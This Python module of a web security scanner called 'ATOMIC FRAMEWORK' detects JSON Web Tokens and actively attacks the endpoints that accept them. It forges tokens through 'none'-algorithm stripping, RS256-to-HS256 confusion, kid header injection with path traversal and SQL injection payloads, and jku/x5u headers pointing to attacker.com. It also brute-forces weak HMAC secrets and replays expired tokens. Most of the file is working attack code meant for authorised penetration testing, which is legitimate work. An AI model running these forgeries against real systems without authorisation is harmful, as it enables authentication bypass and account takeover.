#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - JWT Module
JWT Security testing module
"""

import re
import base64
import json


from config import Colors


class JWTModule:
    """JWT Testing Module"""
    
    def __init__(self, engine):
        self.engine = engine
        self.requester = engine.requester
        self.name = "JWT Weakness"
        
        # JWT patterns
        self.jwt_pattern = r'eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*'
    
    def test(self, url: str, method: str, param: str, value: str):
        """Test for JWT in parameters"""
        # Check if parameter contains JWT
        if re.match(self.jwt_pattern, value):
            self._analyze_jwt(url, param, value)
            # Phase J2: Run advanced JWT attacks
            self._test_kid_injection_advanced(url, method, param, value)
            self._test_jwks_injection(url, method, param, value)
            self._test_weak_secret(url, method, param, value)
            self._test_expired_replay(url, method, param, value)
    
    def test_url(self, url: str):
        """Test URL for JWT"""
        # Extract JWT from cookies/headers
        try:
            response = self.requester.request(url, 'GET')
            
            if not response:
                return
            
            # Check cookies
            cookies = response.headers.get('Set-Cookie', '')
            jwt_matches = re.findall(self.jwt_pattern, cookies)
            
            for jwt in jwt_matches:
                self._analyze_jwt(url, 'Cookie', jwt)
            
            # Check response body
            jwt_matches = re.findall(self.jwt_pattern, response.text)
            for jwt in jwt_matches:
                self._analyze_jwt(url, 'Response Body', jwt)
                
        except Exception as e:
            if self.engine.config.get('verbose'):
                print(f"{Colors.error(f'JWT test error: {e}')}")
    
    def _analyze_jwt(self, url: str, location: str, token: str):
        """Analyze JWT for weaknesses"""
        try:
            # Split JWT
            parts = token.split('.')
            if len(parts) != 3:
                return
            
            # Decode header
            header_b64 = parts[0]
            # Add padding if needed
            header_b64 += '=' * (4 - len(header_b64) % 4)
            header_json = base64.urlsafe_b64decode(header_b64).decode('utf-8')
            header = json.loads(header_json)
            
            # Decode payload
            payload_b64 = parts[1]
            payload_b64 += '=' * (4 - len(payload_b64) % 4)
            payload_json = base64.urlsafe_b64decode(payload_b64).decode('utf-8')
            payload = json.loads(payload_json)
            
            weaknesses = []
            
            # Check algorithm
            alg = header.get('alg', '')
            
            if alg == 'none':
                weaknesses.append("Algorithm 'none' - signature bypass possible")
            elif alg == 'HS256':
                weaknesses.append("Weak HMAC algorithm (HS256)")
            elif alg in ['RS256', 'ES256']:
                # Check for algorithm confusion
                weaknesses.append("Asymmetric algorithm - check for algorithm confusion")
            
            # Check for sensitive data
            sensitive_keys = ['password', 'secret', 'key', 'admin', 'role', 'privileges', 'permissions']
            for key in sensitive_keys:
                if key in json.dumps(payload).lower():
                    weaknesses.append(f"Sensitive data in payload: {key}")
            
            # Check for expired token
            import time
            exp = payload.get('exp')
            if exp and exp < time.time():
                weaknesses.append("Token expired")
            
            # Check for weak secrets (if we can brute force)
            if alg.startswith('HS'):
                weaknesses.append("HMAC algorithm - brute force possible")
            
            if weaknesses:
                from core.engine import Finding
                finding = Finding(
                    technique="JWT Weakness",
                    url=url,
                    severity='HIGH',
                    confidence=0.8,
                    param=location,
                    payload=token[:50] + '...',
                    evidence='; '.join(weaknesses),
                    extracted_data=json.dumps({'header': header, 'payload': payload}, indent=2),
                )
                self.engine.add_finding(finding)
                
            # Run additional JWT tests
            self._test_jku_x5u_injection(url, token)
            self._test_kid_injection(url, token)
            self._test_token_replay(url, token)
                
        except Exception as e:
            if self.engine.config.get('verbose'):
                print(f"{Colors.error(f'JWT analysis error: {e}')}")
    
    def _test_jku_x5u_injection(self, url: str, token: str):
        """Test JKU/X5U header injection"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return
            h = parts[0] + '=' * (4 - len(parts[0]) % 4)
            header = json.loads(base64.urlsafe_b64decode(h).decode('utf-8'))
            if 'jku' in header:
                from core.engine import Finding
                self.engine.add_finding(Finding(
                    technique="JWT (JKU Header Present)", url=url,
                    severity='HIGH', confidence=0.8, param='JWT Header',
                    payload=f"jku: {header['jku']}",
                    evidence="JKU header found — JWKS URL injection possible",
                ))
            if 'x5u' in header:
                from core.engine import Finding
                self.engine.add_finding(Finding(
                    technique="JWT (X5U Header Present)", url=url,
                    severity='HIGH', confidence=0.8, param='JWT Header',
                    payload=f"x5u: {header['x5u']}",
                    evidence="X5U header found — certificate URL injection possible",
                ))
        except Exception:
            pass

    def _test_kid_injection(self, url: str, token: str):
        """Test kid parameter injection"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return
            h = parts[0] + '=' * (4 - len(parts[0]) % 4)
            header = json.loads(base64.urlsafe_b64decode(h).decode('utf-8'))
            if 'kid' in header:
                from core.engine import Finding
                self.engine.add_finding(Finding(
                    technique="JWT (kid Parameter Found)", url=url,
                    severity='MEDIUM', confidence=0.7, param='JWT kid',
                    payload=f"kid: {header['kid']}",
                    evidence="kid parameter present — check for injection",
                ))
        except Exception:
            pass

    def _test_token_replay(self, url: str, token: str):
        """Test JWT token replay and expiry issues"""
        import time as _time
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return
            p = parts[1] + '=' * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(p).decode('utf-8'))
            weaknesses = []
            if 'exp' not in payload:
                weaknesses.append("No 'exp' claim — token never expires")
            elif payload['exp'] < _time.time():
                weaknesses.append(f"Token expired at {payload['exp']}")
            if 'jti' not in payload:
                weaknesses.append("No 'jti' claim — no replay protection")
            if weaknesses:
                from core.engine import Finding
                self.engine.add_finding(Finding(
                    technique="JWT (Token Replay / Expiry Issues)", url=url,
                    severity='MEDIUM', confidence=0.75, param='JWT Payload',
                    payload=str(payload.get('sub', 'N/A')),
                    evidence="; ".join(weaknesses),
                ))
        except Exception:
            pass
    
    def exploit_none_algorithm(self, token: str) -> str:
        """Generate JWT with 'none' algorithm"""
        try:
            parts = token.split('.')
            
            # Modify header to use 'none' algorithm
            header = {'alg': 'none', 'typ': 'JWT'}
            header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
            
            # Keep original payload
            payload_b64 = parts[1]
            
            # Empty signature for 'none' algorithm
            return f"{header_b64}.{payload_b64}."
            
        except Exception as e:
            print(f"{Colors.error(f'JWT none alg exploit error: {e}')}")
            return None
    
    def exploit_algorithm_confusion(self, token: str, public_key: str) -> str:
        """Attempt algorithm confusion attack"""
        try:
            parts = token.split('.')
            
            # Change algorithm from RS256 to HS256
            header = {'alg': 'HS256', 'typ': 'JWT'}
            header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
            
            # Keep original payload
            payload_b64 = parts[1]
            
            # Sign with public key as HMAC secret
            import hmac
            import hashlib
            
            message = f"{header_b64}.{payload_b64}"
            signature = hmac.new(public_key.encode(), message.encode(), hashlib.sha256).digest()
            sig_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
            
            return f"{header_b64}.{payload_b64}.{sig_b64}"
            
        except Exception as e:
            print(f"{Colors.error(f'JWT alg confusion error: {e}')}")
            return None

    # ------------------------------------------------------------------
    # Phase J2: JWT Advanced Attacks
    # ------------------------------------------------------------------

    def _test_kid_injection_advanced(self, url, method, param, token):
        """J2: Key ID (kid) injection — path traversal / SQLi via kid header."""
        kid_payloads = [
            "../../dev/null",
            "/dev/null",
            "../../../../../../dev/null",
            "'; DROP TABLE users; --",
            "' UNION SELECT 'secret' --",
            "../../../../../../etc/passwd",
            "/proc/self/environ",
        ]
        for kid_val in kid_payloads:
            try:
                parts = token.split('.')
                header_json = json.loads(
                    base64.urlsafe_b64decode(parts[0] + '=='))
                header_json['kid'] = kid_val
                header_b64 = base64.urlsafe_b64encode(
                    json.dumps(header_json).encode()).decode().rstrip('=')
                # For /dev/null the signing key would be empty
                import hmac, hashlib
                key = b'' if 'null' in kid_val else kid_val.encode()
                message = f"{header_b64}.{parts[1]}"
                sig = hmac.new(key, message.encode(), hashlib.sha256).digest()
                sig_b64 = base64.urlsafe_b64encode(sig).decode().rstrip('=')
                forged = f"{header_b64}.{parts[1]}.{sig_b64}"

                data = {param: forged} if param else {}
                headers = {}
                if not param:
                    headers['Authorization'] = f'Bearer {forged}'
                resp = self.requester.request(url, method, data=data,
                                              headers=headers)
                if resp and resp.status_code in (200, 201, 204):
                    from core.engine import Finding
                    self.engine.add_finding(Finding(
                        technique='JWT kid Injection',
                        url=url, method=method, param=param or 'Authorization',
                        payload=f'kid={kid_val}',
                        evidence=resp.text[:200] if resp.text else '',
                        severity='CRITICAL', confidence=0.7,
                    ))
                    return
            except Exception:
                continue

    def _test_jwks_injection(self, url, method, param, token):
        """J2: JWKS injection — set jku / x5u to attacker-controlled URL."""
        try:
            parts = token.split('.')
            header_json = json.loads(
                base64.urlsafe_b64decode(parts[0] + '=='))
            for hdr_key, val in [
                ('jku', 'http://attacker.com/.well-known/jwks.json'),
                ('x5u', 'http://attacker.com/cert.pem'),
            ]:
                modified = dict(header_json)
                modified[hdr_key] = val
                header_b64 = base64.urlsafe_b64encode(
                    json.dumps(modified).encode()).decode().rstrip('=')
                forged = f"{header_b64}.{parts[1]}.{parts[2]}"

                data = {param: forged} if param else {}
                headers = {}
                if not param:
                    headers['Authorization'] = f'Bearer {forged}'
                resp = self.requester.request(url, method, data=data,
                                              headers=headers)
                if resp and resp.status_code in (200, 201, 204):
                    from core.engine import Finding
                    self.engine.add_finding(Finding(
                        technique=f'JWT {hdr_key} Injection',
                        url=url, method=method, param=param or 'Authorization',
                        payload=f'{hdr_key}={val}',
                        evidence=resp.text[:200] if resp.text else '',
                        severity='HIGH', confidence=0.6,
                    ))
        except Exception:
            pass

    def _test_weak_secret(self, url, method, param, token):
        """J2: Brute-force HS256 weak secret offline."""
        common_secrets = [
            'secret', 'password', '123456', 'key', 'test', 'admin',
            'changeme', 'jwt_secret', 'token', 'supersecret',
            'HS256-secret', 'default', 'pass', 'qwerty', '',
            'letmein', 'welcome', 'P@ssw0rd', 'jwt', 'secret123',
        ]
        import hmac, hashlib
        try:
            parts = token.split('.')
            message = f"{parts[0]}.{parts[1]}".encode()
            original_sig = base64.urlsafe_b64decode(parts[2] + '==')
            for secret in common_secrets:
                sig = hmac.new(secret.encode(), message, hashlib.sha256).digest()
                if sig == original_sig:
                    from core.engine import Finding
                    self.engine.add_finding(Finding(
                        technique='JWT Weak Secret',
                        url=url, method=method, param=param or 'Authorization',
                        payload=f'secret="{secret}"',
                        evidence=f'JWT signed with weak secret: {secret!r}',
                        severity='CRITICAL', confidence=0.95,
                    ))
                    return
        except Exception:
            pass

    def _test_expired_replay(self, url, method, param, token):
        """J2: Test if expired tokens are still accepted."""
        try:
            parts = token.split('.')
            payload_json = json.loads(
                base64.urlsafe_b64decode(parts[1] + '=='))
            exp = payload_json.get('exp')
            if exp is None:
                return
            import time as _time
            if exp < _time.time():
                # Token is already expired — send it as-is
                data = {param: token} if param else {}
                headers = {}
                if not param:
                    headers['Authorization'] = f'Bearer {token}'
                resp = self.requester.request(url, method, data=data,
                                              headers=headers)
                if resp and resp.status_code in (200, 201, 204):
                    from core.engine import Finding
                    self.engine.add_finding(Finding(
                        technique='JWT Expired Token Accepted',
                        url=url, method=method, param=param or 'Authorization',
                        payload='expired JWT',
                        evidence=f'Expired (exp={exp}) but status={resp.status_code}',
                        severity='HIGH', confidence=0.8,
                    ))
        except Exception:
            pass
